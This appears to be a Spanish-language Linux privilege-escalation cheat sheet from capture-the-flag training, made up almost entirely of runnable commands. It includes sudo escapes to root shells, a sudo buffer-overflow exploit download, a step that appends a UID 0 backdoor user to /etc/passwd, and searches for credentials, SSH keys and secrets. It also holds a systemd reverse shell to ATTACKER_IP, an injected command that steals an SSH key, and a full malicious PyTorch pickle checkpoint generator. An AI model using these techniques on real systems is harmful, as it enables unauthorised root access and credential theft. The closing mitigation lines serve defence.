#### 🧠 Desplegable
```bash
pwd
```

#### 🧠 Desplegable
```bash
ls -l
```

#### 🧠 Desplegable
```bash
drwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:37 Desktop
```

#### 🧠 Desplegable
```bash
ls -la
```

#### 🧠 Desplegable
```bash
drwxr-xr-x 2 cry0l1t3 htbacademy 4096 Nov 13 17:37 .bash_history
```

#### 🧠 Desplegable
```bash
ls -l /var/
```

#### 🧠 Desplegable
```bash
drwxr-xr-x 2 root root 4096 May 15 18:54 backups
```

#### 🧠 Desplegable
```bash
cd /dev/shm
```

#### 🧠 Desplegable
```bash
cd -
```

#### 🧠 Desplegable
```bash
cd /dev/s [TAB] [TAB]
```

#### 🧠 Desplegable
```bash
ls -la /dev/shm
```

#### 🧠 Desplegable
```bash
cd ..
```

#### 🧠 Desplegable
```bash
cd shm && clear
```

#### 🧠 Personalización del Mensaje Bash (PS1)
```bash
PS1="\u@\h[\w]\$ "
```

#### 🧠 Personalización del Mensaje Bash (PS1)
```bash
PS1="\[\e[1;32m\]\u@\h:\w\$\[\e[0m\] "
```

#### 🧠 Desplegable
```bash
ssh htb-student@[IP address]
```

#### 🧠 Desplegable
```bash
uid=1000(cry0l1t3) gid=1000(cry0l1t3) groups=1000(cry0l1t3),1337(hackthebox),4(adm),27(sudo)
```

#### Asigna o muestra direcciones de red en interfaces.
```bash
ifconfig
```

#### 🧠 Desplegable
```bash
mkdir <name>
```

#### 🧠 Desplegable
```bash
mkdir Storage
```

#### 🧠 Desplegable
```bash
mkdir -p Storage/local/user/documents
```

#### 🧠 Desplegable
```bash
mv <file/directory> <new_name_or_location>
```

#### 🧠 Desplegable
```bash
mv info.txt information.txt
```

#### 🧠 Desplegable
```bash
mv information.txt readme.txt Storage/
```

#### 🧠 Desplegable
```bash
cp Storage/readme.txt Storage/local/
```

#### 🟢 1) Comando para crear el usuario (dbus)
```bash
dbus-send --system --dest=org.freedesktop.Accounts
```

#### 🟢 4) Ejecutar el ataque de condición de carrera (crear y matar a mitad)
```bash
string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
```

#### 🟢 5) Generar el hash SHA512-crypt para la contraseña `Expl01ted
```bash
openssl passwd -6 Expl01ted
```

#### 🟢 6) Enviar el SetPassword con la misma técnica de carrera
```bash
string:'Ask the pentester' & sleep 0.005s; kill $!
```

#### 🟢 7) Escalar y comprobar
```bash
sudo -s
```

#### 🐧 CVE-2019-18634 – sudo pwfeedback Buffer Overflow (Root PrivEsc)
```bash
sudo --version
```

#### 🐧 CVE-2019-18634 – sudo pwfeedback Buffer Overflow (Root PrivEsc)
```bash
perl -e 'print "A" x 1000' | sudo -S id
```

#### 🐧 CVE-2019-18634 – sudo pwfeedback Buffer Overflow (Root PrivEsc)
```bash
wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
```

#### 🐧 CVE-2019-18634 – sudo pwfeedback Buffer Overflow (Root PrivEsc)
```bash
./exploit
```

#### Command execution
```bash
cat /etc/passwd       # Muestra los usuarios del sistema
```

#### Command execution
```bash
cat /etc/group        # Muestra los grupos del sistema
```

#### Command execution
```bash
cat /etc/shadow       # Muestra las contraseñas cifradas
```

#### Command execution
```bash
hostname              # Muestra el nombre del sistema
```

#### Command execution
```bash
who                   # Muestra quién está conectado
```

#### Command execution
```bash
whoami                # Muestra el nombre de usuario efectivo
```

#### Command execution
```bash
ip address show       # Muestra las interfaces de red y sus direcciones
```

#### Command execution
```bash
sudo lsof -i          # Muestra servicios que están escuchando
```

#### Command execution
```bash
rpm -qa               # Lista paquetes instalados en sistemas RPM
```

#### Command execution
```bash
dpkg -l               # Lista paquetes instalados en sistemas Debian
```

#### Command execution
```bash
ls -lh /var/mail/     # Lista correos electrónicos
```

#### Command execution
```bash
ls -lh /usr/bin/      # Lista aplicaciones instaladas
```

#### Command execution
```bash
ls -lh /sbin/         # Lista binarios del sistema
```

#### Command execution
```bash
ps -e                # Muestra todos los procesos
```

#### Command execution
```bash
ps -f                # Listado de formato completo
```

#### Command execution
```bash
ps -aux | grep peter # Muestra procesos en ejecución relacionados con 'peter'
```

#### Command execution
```bash
sed 's/old/new/g' file.txt    # Reemplaza 'old' con 'new' en file.txt
```

#### Command execution
```bash
awk '{print $1}' file.txt     # Imprime la primera columna de file.txt
```

#### Command execution
```bash
grep 'pattern' file.txt       # Busca 'pattern' en file.txt
```

#### Command execution
```bash
cut -d':' -f1 /etc/passwd     # Corta el primer campo de /etc/passwd delimitado por ':'
```

#### Command execution
```bash
sort file.txt                 # Ordena las líneas de file.txt
```

#### Command execution
```bash
uniq file.txt                 # Elimina líneas duplicadas de file.txt
```

#### Command execution
```bash
ps -ef | grep peter
```

#### Command execution
```bash
| Configuración | Descripción |
```

#### Command execution
```bash
| PasswordAuthentication yes | Permite la autenticación basada en contraseña. |
```

#### Command execution
```bash
| PermitEmptyPasswords yes | Permite el uso de contraseñas vacías. |
```

#### Command execution
```bash
| PermitRootLogin yes | Permite iniciar sesión como usuario root. |
```

#### Command execution
```bash
| Protocol 1 | Utiliza una versión obsoleta de cifrado. |
```

#### Command execution
```bash
| X11Forwarding yes | Permite el reenvío X11 para aplicaciones GUI. |
```

#### Command execution
```bash
| AllowTcpForwarding yes | Permite el reenvío de puertos TCP. |
```

#### Command execution
```bash
| PermitTunnel | Permite la tunelización. |
```

#### Command execution
```bash
| DebianBanner yes | Muestra un banner específico al iniciar sesión. |
```

#### Command execution
```bash
Comandos:
```

#### Command execution
```bash
Ejemplo de Resultados:
```

#### Command execution
```bash
Comando:
```

#### Command execution
```bash
Versión de SSH:
```

#### Command execution
```bash
Configuraciones Avanzadas:
```

#### Command execution
```bash
Cifrado y Algoritmos:
```

#### Command execution
```bash
Registro y Monitoreo:
```

#### Command execution
```bash
Medidas Adicionales:
```

#### Command execution
```bash
Banner de Advertencia: Configura un mensaje de advertencia (Banner /etc/issue.net).
```

#### Command execution
```bash
Ejemplo de /etc/hosts.equiv:
```

#### Command execution
```bash
Ejemplo de .rhosts:
```

#### Command execution
```bash
(Arch Linux, 2022), https://wiki.archlinux.org/index.php/usuarios_y_grupos ↩︎
```

#### Command execution
```bash
(Wikipedia, 2022), https://en.wikipedia.org/wiki/File-system_permissions ↩︎
```

#### Command execution
```bash
Contraseña cifrada : "x": este campo normalmente contiene la versión en hash de la contraseña del usuario. En este caso, el valor x significa que el hash completo de la contraseña está contenido en el archivo /etc/shadow (más información sobre esto en breve).
```

#### Command execution
```bash
Carpeta de inicio : "/home/joe": describe el directorio de inicio del usuario que se solicita al iniciar sesión.
```

#### Command execution
```bash
Shell de inicio de sesión : "/bin/bash" - Indica el shell interactivo predeterminado, si existe.
```

#### Command execution
```bash
Además del usuario joe , también observamos otro usuario llamado eve , y podemos inferir que se trata de un usuario estándar ya que tiene una carpeta de inicio configurada /home/eve . Por otro lado, los servicios del sistema están configurados con /usr/sbin/nologin como shell de inicio de sesión, donde la declaración nologin se utiliza para bloquear cualquier inicio de sesión remoto o local para las cuentas de servicio.
```

#### Command execution
```bash
Dependiendo de la versión de Linux, podemos listar la configuración TCP/IP de cada adaptador de red con ifconfig 8 o ip 9 . Mientras que el primer comando muestra las estadísticas de la interfaz, el segundo proporciona una versión compacta de la misma información. Ambos comandos aceptan el indicador a para mostrar toda la información disponible.
```

#### Command execution
```bash
Por ejemplo, podemos listar todas las conexiones con -a , evitar la resolución del nombre de host (que puede detener la ejecución del comando) con -n , y listar el nombre del proceso al que pertenece la conexión con -p . Podemos combinar los argumentos y simplemente ejecutar ss -anp :
```

#### Command execution
```bash
Por ejemplo, el paquete iptables-persistent 15 en Debian Linux guarda las reglas del cortafuegos en archivos específicos en /etc/iptables de manera predeterminada. El sistema utiliza estos archivos para restaurar las reglas de netfilter 16 en el momento del arranque. Estos archivos suelen quedar con permisos débiles, lo que permite que cualquier usuario local en el sistema de destino los lea.
```

#### Command execution
```bash
También podemos buscar archivos creados por el comando iptables-save , que se utiliza para volcar la configuración del firewall a un archivo especificado por el usuario. Este archivo se utiliza generalmente como entrada para el comando iptables-restore y se utiliza para restaurar las reglas del firewall en el momento del arranque. Si un administrador del sistema alguna vez hubiera ejecutado este comando, podríamos buscar en el directorio de configuración ( /etc ) o buscar en el sistema de archivos comandos iptables para localizar el archivo. Si el archivo tiene permisos inseguros, podríamos utilizar el contenido para inferir las reglas de configuración del firewall que se están ejecutando en el sistema.
```

#### Command execution
```bash
Para listar las aplicaciones instaladas por dpkg en nuestro sistema Debian, podemos usar dpkg -l .
```

#### Command execution
```bash
En el ejemplo siguiente, buscamos todos los directorios en los que el usuario actual puede escribir en el sistema de destino. Buscaremos en todo el directorio raíz ( / ) y utilizaremos el argumento -writable para especificar el atributo que nos interesa. También podemos utilizar -type d para localizar directorios y filtrar errores con 2>/dev/null :
```

#### Command execution
```bash
En los sistemas basados en Linux, podemos usar mount 21 para enumerar todos los sistemas de archivos montados. Además, el archivo /etc/fstab 22 enumera todas las unidades que se montarán en el momento del arranque.
```

#### Command execution
```bash
Tenga en cuenta que el administrador del sistema podría haber utilizado configuraciones o secuencias de comandos personalizadas para montar unidades que no están incluidas en el archivo /etc/fstab . Por este motivo, es recomendable no solo escanear /etc/fstab , sino también recopilar información sobre las unidades montadas mediante mount .
```

#### Command execution
```bash
(Proyecto de páginas de manual de Linux, 2019), http://man7.org/linux/man-pages/man1/id.1.html ↩︎
```

#### Command execution
```bash
(Wikipedia, 2022), https://en.wikipedia.org/wiki/User_identifier ↩︎
```

#### Command execution
```bash
(Peter Tobias, 2003), https://linux.die.net/man/1/hostname ↩︎
```

#### Command execution
```bash
(Proyecto de páginas de manual de Linux, 2018), http://man7.org/linux/man-pages/man1/ps.1.html ↩︎
```

#### Command execution
```bash
(Linus Åkesson, 2018), https://www.linusakesson.net/programming/tty/ ↩︎
```

#### Command execution
```bash
(Fred N. van Kempen, 2003), https://linux.die.net/man/8/ifconfig ↩︎
```

#### Command execution
```bash
(Proyecto de páginas manuales de Linux, 2011), http://man7.org/linux/man-pages/man8/ip.8.html ↩︎
```

#### Command execution
```bash
(Phil Blundell, 2003), https://linux.die.net/man/8/route ↩︎
```

#### Command execution
```bash
(Proyecto de páginas manuales de Linux, 2008), http://man7.org/linux/man-pages/man8/routel.8.html ↩︎
```

#### Command execution
```bash
(Proyecto de páginas de manual de Linux, 2019), http://man7.org/linux/man-pages/man8/ss.8.html ↩︎
```

#### Command execution
```bash
(Hervé Eychenne, 2003), https://linux.die.net/man/8/iptables ↩︎
```

#### Command execution
```bash
(Debian, SPI Inc., 2023), https://packages.debian.org/sid/iptables-persistent ↩︎
```

#### Command execution
```bash
(Equipo central de Netfilter, 2023), https://www.netfilter.org/ ↩︎
```

#### Command execution
```bash
(Linux.die.net, 2003), https://linux.die.net/man/1/dpkg ↩︎
```

#### Command execution
```bash
(Marc Ewing, 2003), https://linux.die.net/man/8/rpm ↩︎
```

#### Command execution
```bash
(Proyecto de páginas de manual de Linux, 2019), http://man7.org/linux/man-pages/man1/find.1.html ↩︎
```

#### Command execution
```bash
(Linux.die.net, 2003), https://linux.die.net/man/8/mount ↩︎
```

#### Command execution
```bash
(Universidad Geek, 2019), https://geek-university.com/linux/etc-fstab-file ↩︎
```

#### Command execution
```bash
(Linux.die.net, 2003), https://linux.die.net/man/8/lsblk ↩︎
```

#### Command execution
```bash
(G0tmi1k, 2011), https://blog.g0tmi1k.com/2011/08/escalada-de-privilegios-basicos-en-linux ↩︎
```

#### Command execution
```bash
(Swissky, 2022), https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Metodología y recursos/Linux - Escalada de privilegios.md ↩︎
```

#### Command execution
```bash
(Carlos Polop, 2022), https://book.hacktricks.xyz/linux-hardening/privilege-escalation ↩︎
```

#### Command execution
```bash
| Escalada de privilegios de Linux: enumeración manual, máquina virtual n.° 1 |  |  |
```

#### Command execution
```bash
| Escalada de privilegios de Linux: enumeración manual, máquina virtual n.° 2 |  |  |
```

#### Command execution
```bash
R:buster
```

#### Command execution
```bash
R: euid
```

#### Command execution
```bash
OS{aa2d41c241874d69ca2b0c3ee730b7c0}
```

#### Command execution
```bash
Como se muestra en la lista anterior, el script admite el modo "estándar" y "detallado". Según la información proporcionada, el modo estándar parece realizar un proceso optimizado en términos de velocidad y debería proporcionar una cantidad reducida de falsos positivos. Por lo tanto, en el siguiente ejemplo, transferiremos el script al sistema de destino y utilizaremos el modo estándar para redirigir toda la salida a un archivo llamado output.txt .
```

#### Command execution
```bash
Este resultado revela que cualquier persona en el sistema puede editar /etc/passwd . Esto es bastante significativo, ya que permite a los atacantes elevar fácilmente sus privilegios 2 o crear cuentas de usuario en el objetivo. Demostraremos esto más adelante en el Módulo.
```

#### Command execution
```bash
(Raj Chandel, 2018), https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation ↩︎
```

#### Command execution
```bash
R: OS{042078b01b2d2238ce6d2a1184b8470f}
```

#### Command execution
```bash
Podemos hacer esto usando la herramienta de línea de comandos Crunch para generar una lista de palabras personalizada. Fijaremos la longitud mínima y máxima en 6 caracteres, especificaremos el patrón usando el parámetro -t y luego codificaremos los primeros tres caracteres en Lab seguidos de tres dígitos numéricos.
```

#### Command execution
```bash
Dado que hay un servidor SSH disponible en nuestra máquina de destino, podemos intentar un ataque de fuerza bruta remoto a través de Hydra. Proporcionaremos el nombre de usuario de destino con el parámetro -l , nuestra lista de palabras con -P , la dirección IP de destino y, por último, ssh como protocolo de destino. También incluiremos -V para aumentar la verbosidad.
```

#### Command execution
```bash
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret
```

#### Command execution
```bash
chmod u+s /bin/bash
```

#### Command execution
```bash
set `cat /proc/$$/status| grep "CapEff:"`; capsh --decode=$2 | grep sys_admin
```

#### Command execution
```bash
chmod a+x /cmd
```

#### Command execution
```bash
find / -group debug 2</dev/null = /usr/bin/gdb
```

#### Command execution
```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
```

#### Command execution
```bash
cd lxd-alpine-builder
```

#### Command execution
```bash
python3 -m http.server 8000
```

#### Command execution
```bash
wget http://10.10.14.13:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

#### Command execution
```bash
cat /mnt/root/root/root.txt
```

#### Command execution
```bash
find / -name os.py 2</dev/null
```

#### Command execution
```bash
find -type f -writable -ls
```

#### Comando que intenta escalar privilegios en un sistema Linux mediante la ejecución de un comando como otro usuario y la extracción de una clave SSH
```bash
sudo -u developer /usr/local/bin/meta-git clone 'sss||cat /home/developer/.ssh/id_rsa'
```

#### Ejecución de comando para obtener permisos de superusuario en Linux mediante la configuración de APT
```bash
"APT::Update::Pre-Invoke {"chmod u+s /bin/bash";};"
```

#### Command execution
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py [full-checkup.sh](http://full-checkup.sh/)
```

#### UID, GID, grupos del usuario actual — todo de un golpe
```bash
id && whoami && groups
```

#### Nombre de host + entradas DNS locales. Puede revelar otros hosts internos
```bash
hostname && cat /etc/hosts
```

#### Variables de entorno del usuario y del proceso init. Buscar contraseñas, tokens, rutas
```bash
env && cat /proc/1/environ 2>/dev/null | tr '\0' '\n'
```

#### Usuarios con shell válida — candidatos de movimiento lateral
```bash
cat /etc/passwd | grep -v nologin | grep -v false
```

#### Hashes de contraseñas. Solo root. Si es legible es una victoria directa
```bash
cat /etc/shadow 2>/dev/null
```

#### Todos los procesos en árbol (padre-hijo). Buscar procesos root con rutas escribibles
```bash
ps auxf
```

#### Usuarios únicos con procesos activos
```bash
ps aux | grep -v '\[' | awk 'NR>1 {print $1}' | sort -u
```

#### Red: interfaces, rutas y DNS
```bash
ip a && ip r && cat /etc/resolv.conf
```

#### Historial de comandos. Frecuentemente contiene contraseñas en claro
```bash
history && cat ~/.bash_history 2>/dev/null && cat ~/.zsh_history 2>/dev/null
```

#### Claves SSH privadas del usuario. Si existen, intentar conectar a otros hosts
```bash
cat ~/.ssh/id_rsa 2>/dev/null && ls -la ~/.ssh/
```

#### Paquetes instalados. Buscar versiones vulnerables
```bash
dpkg -l 2>/dev/null | head -30 ; rpm -qa 2>/dev/null | head -30
```

#### Directorios home de otros usuarios
```bash
ls /home/
```

#### Mail del sistema. A veces contiene credenciales o información sensible
```bash
ls -la /var/mail/ 2>/dev/null && cat /var/mail/$USER 2>/dev/null
```

#### Intentos de autenticación recientes. Puede revelar usuarios y patrones
```bash
cat /var/log/auth.log 2>/dev/null | tail -50
```

#### Claves privadas SSH/TLS en todo el sistema
```bash
find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' 2>/dev/null
```

#### Archivos de configuración con credenciales
```bash
find / -name '*.conf' -o -name '*.config' -o -name '*.cfg' 2>/dev/null | xargs grep -l 'password\|passwd\|secret\|token' 2>/dev/null
```

#### Archivos de credenciales de aplicaciones web comunes
```bash
find / -name '.htpasswd' -o -name 'wp-config.php' -o -name 'database.yml' -o -name '.env' 2>/dev/null
```

#### Archivos de backup. Frecuentemente contienen configs antiguas con credenciales
```bash
find / -name '*.bak' -o -name '*.old' -o -name '*.orig' -o -name '*.backup' 2>/dev/null
```

#### Claves autorizadas SSH en todos los usuarios
```bash
find / -name 'authorized_keys' 2>/dev/null
```

#### Credenciales en código fuente web
```bash
grep -r 'password\|passwd\|secret\|token\|api_key' /var/www/ 2>/dev/null | head -20
```

#### Directorios no estándar. Frecuentemente contienen herramientas, scripts o datos sensibles
```bash
ls -la /opt/ /srv/ /var/www/ /var/backups/ /tmp/ /var/tmp/ 2>/dev/null
```

#### Root directo si bash está permitido sin restricciones
```bash
sudo /bin/bash
```

#### Root via Python3 con sudo. Válido para python, python2, python3
```bash
sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

#### Root via Vim. También funciona: :set shell=/bin/bash | :shell
```bash
sudo /usr/bin/vim -c ':!/bin/bash'
```

#### Root via Nano con -c (permite ejecutar comandos). Ctrl+R, Ctrl+X
```bash
sudo /usr/bin/nano -c && ^R^X reset; sh 1>&0 2>&0
```

#### Root via Less. Desde el paginador escribir !bash o !/bin/bash
```bash
sudo /usr/bin/less /etc/passwd  # luego escribir: !/bin/bash
```

#### Root via find con sudo
```bash
sudo /usr/bin/find /tmp -exec /bin/bash \;
```

#### Root via awk con sudo
```bash
sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

#### Root via nmap interactivo (versiones antiguas <5.x)
```bash
sudo /usr/bin/nmap --interactive  # luego: !sh
```

#### Root via Perl con sudo
```bash
sudo /usr/bin/perl -e 'exec "/bin/bash";'
```

#### Root via Ruby con sudo
```bash
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
```

#### Root via Lua con sudo
```bash
sudo /usr/bin/lua -e 'os.execute("/bin/bash")'
```

#### Si curl tiene sudo: leer archivos privilegiados
```bash
sudo /usr/bin/curl file:///etc/shadow
```

#### Root via env con sudo (env preserva el entorno y ejecuta bash)
```bash
sudo /usr/bin/env /bin/bash
```

#### Root via strace con sudo
```bash
sudo /usr/bin/strace -o /dev/null /bin/bash
```

#### Comprobar si /etc/passwd es escribible. Si lo es, es root directo
```bash
ls -la /etc/passwd && stat /etc/passwd
```

#### Genera hash MD5crypt compatible con /etc/passwd. Formato: $1$salt$hash
```bash
openssl passwd -1 'hacker123'
```

#### Genera hash SHA-512 (más moderno). Más seguro pero funciona igual
```bash
openssl passwd -6 'hacker123'
```

#### Añade usuario 'hacker' con UID 0 (root) y contraseña 'hacker123'. Luego: su hacker
```bash
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

#### Cambiar al usuario recién creado con UID 0. Contraseña: la que usaste en openssl passwd
```bash
su hacker
```

#### Si /etc/shadow no es accesible pero /etc/passwd es escribible, puedes meter el hash directamente en /etc/passwd (el 'x' es solo un indicador de que mire shadow)
```bash
# Alternativa: si /etc/passwd tiene 'x' en shadow, sustituir por hash directo
# Copiar línea de root y modificarla:
head -1 /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# Cambiar 'x' por el hash generado con openssl passwd
```

#### Buscar archivos .service o directorios systemd escribibles por el usuario actual
```bash
find /etc/systemd/system/ /lib/systemd/system/ -writable 2>/dev/null
```

#### Unit files escribibles. Si puedes modificar uno que corre como root, es privesc
```bash
find /etc/systemd/ -name '*.service' -writable 2>/dev/null
```

#### Ver qué binario ejecuta el servicio. Comprobar si ese binario es escribible
```bash
cat /lib/systemd/system/servicio_vulnerable.service | grep ExecStart
```

#### Reemplazar ExecStart con reverse shell. Reiniciar el servicio para ejecutar como root
```bash
# Modificar ExecStart en el .service escribible:
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

systemctl daemon-reload && systemctl restart servicio_modificado
```

#### Scripts init.d (SysV). Algunos sistemas aún los usan. Escribibles = privesc
```bash
ls -la /etc/init.d/ && find /etc/init.d/ -writable 2>/dev/null
```

#### Grupo disk: debugfs permite leer cualquier archivo del sistema de archivos directamente, incluyendo /etc/shadow
```bash
# Grupo disk: acceso raw a dispositivos de bloque
df -h
debugfs /dev/sda1
# Dentro de debugfs:
cat /etc/shadow
```

#### Grupo adm: leer logs que a veces contienen contraseñas en claro (intentos fallidos con contraseña en usuario, configs, etc.)
```bash
# Grupo adm: leer logs del sistema
cat /var/log/auth.log | grep -i 'password\|pass'
cat /var/log/syslog | grep -i 'password'
grep -r 'password' /var/log/
```

#### Grupo shadow: acceso directo a /etc/shadow. Obtener hashes y crackear offline
```bash
# Grupo shadow: leer /etc/shadow directamente
cat /etc/shadow
# Luego crackear con hashcat:
hashcat -m 1800 shadow.txt wordlist.txt
```

#### Grupo video: leer el framebuffer para capturar la pantalla del sistema
```bash
# Grupo video: capturar framebuffer (pantalla)
cat /dev/fb0 > /tmp/screen.raw
# Convertir con GIMP o ffmpeg
```

#### Grupo sudo/wheel: necesitas la contraseña del usuario, pero a veces está en historial o configs
```bash
# Grupo sudo / wheel
# Si estás en el grupo pero no conoces la contraseña,
# buscar en historial, archivos de config, memoria de procesos
```

#### Historial de comandos. Contraseñas pasadas como argumento: mysql -u root -p'contraseña'
```bash
history && cat ~/.bash_history ~/.zsh_history ~/.sh_history 2>/dev/null
```

#### Buscar credenciales hardcoded en archivos de configuración y código
```bash
grep -rn 'password\|passwd\|secret\|credential\|token\|api_key\|db_pass' /home/ /var/www/ /opt/ /srv/ 2>/dev/null | grep -v '.git' | head -30
```

#### Claves privadas SSH en todo el sistema
```bash
find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' 2>/dev/null | xargs ls -la 2>/dev/null
```

#### Credenciales WordPress: DB_USER, DB_PASSWORD
```bash
cat /var/www/html/wp-config.php 2>/dev/null | grep -i 'DB_\|pass'
```

#### Archivos .env de aplicaciones (Laravel, Node, Django...) con credenciales de BD y APIs
```bash
find / -name '.env' 2>/dev/null | xargs cat 2>/dev/null
```

#### Historial de MySQL: puede contener queries con contraseñas o datos sensibles
```bash
cat /root/.mysql_history 2>/dev/null && cat /home/*/.mysql_history 2>/dev/null
```

#### Archivos KeePass o archivos con 'password' en el nombre
```bash
find / -name '*.kdbx' -o -name 'pass*.txt' -o -name '*password*' 2>/dev/null
```

#### Variables de entorno de todos los procesos en ejecución. Tokens, contraseñas en memoria
```bash
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i 'pass\|secret\|token\|key'
```

---

## 12 — AI/ML Red Team Drill: PyTorch / MONAI Model Serialization Exploit

#### Mapa completo de la escalada. Se necesitan simultaneamente la shell del contenedor y la shell SSH de developer.
```bash
datawrangler (dataops) -> /datastore/checkpoints/*.pt -> developer sudo trainer -> MONAI CheckpointLoader -> torch.load/pickle -> chmod SUID -> bash -p
```

#### Fallo de la aplicacion Bedside. No atribuirle el CVE de pdfminer aunque ambos exploten Pickle.
```bash
CWE-502 | Insecure Deserialization | Untrusted PyTorch checkpoint | root execution context
```

#### Debe aparecer: (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py.
```bash
id
sudo -l
```

#### No ejecutes un script permitido por sudo sin revisar primero todos sus inputs y efectos.
```bash
sed -n '1,340p' /opt/trainer/bedside_trainer.py
```

#### El script requiere datos en processed, selecciona el .pt mas reciente y lo carga mediante CheckpointLoader.
```bash
grep -nE 'DATASTORE_ROOT|CHECKPOINT_DIR|PROCESSED_DIR|find_latest_checkpoint|CheckpointLoader|loader\(engine\)|torch\.load|weights_only' /opt/trainer/bedside_trainer.py
```

#### Permission denied desde developer es esperado. El checkpoint debe colocarlo datawrangler, miembro de dataops.
```bash
ls -ld /datastore /datastore/checkpoints /datastore/processed 2>&1
id
```

#### Sin un archivo de imagen valido el trainer muestra No data available to train y termina antes de CheckpointLoader.
```bash
/datastore/processed/scan.png
```

#### Debe devolver 50 4b 03 04. Un pickle plano no sirve: torch.load espera el contenedor ZIP con archive/data.pkl.
```bash
head -c4 checkpoint_epoch_99.pt | od -An -tx1
```

#### find_latest_checkpoint ordena por mtime. Se usa touch para asegurar que checkpoint_epoch_99.pt sea el ultimo.
```bash
find /datastore/checkpoints -maxdepth 1 -name '*.pt' -printf '%T@ %p\n' 2>/dev/null | sort -n | tail
```

#### Generador autocontenido. El metodo __reduce__ define la funcion y argumentos que Pickle ejecutara al cargar el objeto.
```bash
mkdir -p ~/bedside-privesc && cd ~/bedside-privesc
cat > build_evil_pt.py <<'PY'
#!/usr/bin/env python3
import argparse
import os
import pickle
import zipfile

class RCE:
    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        return os.system, (self.command,)

def build(command, output):
    payload = pickle.dumps({'model': RCE(command)}, protocol=2)
    with zipfile.ZipFile(output, 'w', zipfile.ZIP_STORED) as archive:
        archive.writestr('archive/data.pkl', payload)
        archive.writestr('archive/version', '3\n')
    with open(output, 'rb') as handle:
        print('[+] magic:', handle.read(4).hex())

parser = argparse.ArgumentParser()
parser.add_argument('-c', '--command', default='chmod +s /bin/bash')
parser.add_argument('-o', '--output', default='checkpoint_epoch_99.pt')
args = parser.parse_args()
build(args.command, args.output)
PY
```

#### La firma debe ser PK/ZIP: 50 4b 03 04.
```bash
cd ~/bedside-privesc
python3 build_evil_pt.py -c 'chmod +s /bin/bash' -o checkpoint_epoch_99.pt
file checkpoint_epoch_99.pt
head -c4 checkpoint_epoch_99.pt | od -An -tx1
```

#### scan.png permite superar la puerta del DataLoader antes de cargar el checkpoint.
```bash
cd ~/bedside-privesc
cp "$(find /usr/share/icons -type f -iname '*.png' | head -n1)" scan.png
file scan.png
```

#### Anota la IP de tun0 y deja esta terminal Kali ejecutando el servidor HTTP.
```bash
ip -br address show tun0
cd ~/bedside-privesc
python3 -m http.server 8000 --bind 0.0.0.0
```

#### Debe mostrar datawrangler, hostname data-wrangler y el grupo dataops.
```bash
whoami
hostname
id
```

#### Sustituye TUN0_IP por la direccion real mostrada en Kali.
```bash
cd /tmp
curl -f http://TUN0_IP:8000/checkpoint_epoch_99.pt -o checkpoint_epoch_99.pt
curl -f http://TUN0_IP:8000/scan.png -o scan.png
```

#### Comprueba que scan.png es una imagen y el checkpoint comienza con 50 4b 03 04.
```bash
file /tmp/scan.png
head -c4 /tmp/checkpoint_epoch_99.pt | od -An -tx1
```

#### datawrangler puede escribir gracias a dataops. touch obliga al trainer a elegir el payload como checkpoint mas reciente.
```bash
cp /tmp/scan.png /datastore/processed/scan.png
cp /tmp/checkpoint_epoch_99.pt /datastore/checkpoints/checkpoint_epoch_99.pt
touch /datastore/checkpoints/checkpoint_epoch_99.pt
ls -l /datastore/processed/scan.png
ls -lt /datastore/checkpoints | head
```

#### Deja esta shell abierta ejecutando el bucle mientras disparas el trainer desde developer.
```bash
while true; do
  rm -f /datastore/staging/*.txt /datastore/processed/*.txt 2>/dev/null
  cp -n /tmp/scan.png /datastore/processed/scan.png 2>/dev/null
  sleep 0.3
done
```

#### Debe mostrar Using 1 samples, localizar checkpoint_epoch_99.pt e intentar cargarlo mediante CheckpointLoader.
```bash
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py --epochs 1
```

#### Este error ocurre despues del payload. os.system ya ejecuto chmod y devolvio 0; luego MONAI intento tratar ese entero como state_dict.
```bash
TypeError: Expected state_dict to be dict-like, got <class 'int'>
```

#### El resultado esperado empieza por -rws: el bit s confirma que chmod se ejecuto como root.
```bash
ls -l /bin/bash
stat -c '%A %a %U:%G %n' /bin/bash
```

#### La opcion -p conserva el euid del binario SUID. id debe mostrar euid=0(root).
```bash
/bin/bash -p
id
cat /root/root.txt
```

#### El script se crea en Kali. No debe buscarse en /home/developer de Bedside.
```bash
pwd
whoami
ls -l ~/bedside-privesc/build_evil_pt.py 2>/dev/null
```

#### Si aparece developer@bedside, cambia a la shell datawrangler. developer solo dispara el sudo.
```bash
whoami; hostname; id; ls -ld /datastore 2>&1
```

#### scan.png falta, fue movido o la tuberia contiene datos no validos. Revisa el limpiador.
```bash
find /datastore/processed -maxdepth 1 -type f -printf '%f\n' 2>/dev/null
```

#### Si no devuelve 50 4b 03 04, vuelve a generarlo en Kali y descargalo de nuevo.
```bash
head -c4 /tmp/checkpoint_epoch_99.pt | od -An -tx1
```

#### Usar weights_only=True, state_dicts simples y un schema estricto. No cargar objetos Python arbitrarios.
```bash
torch.load(path, map_location='cpu', weights_only=True)
```

#### Fuerza el cargador restringido cuando no se puede modificar inmediatamente cada callsite.
```bash
export TORCH_FORCE_WEIGHTS_ONLY_LOAD=1
```

#### El contenedor de uploads no debe escribir en el directorio que consume un proceso root. Verificar firma y hash antes de promover un modelo.
```bash
Root-owned checkpoint directory | signed artifacts | SHA-256 allowlist | atomic promotion | least-privilege trainer
```

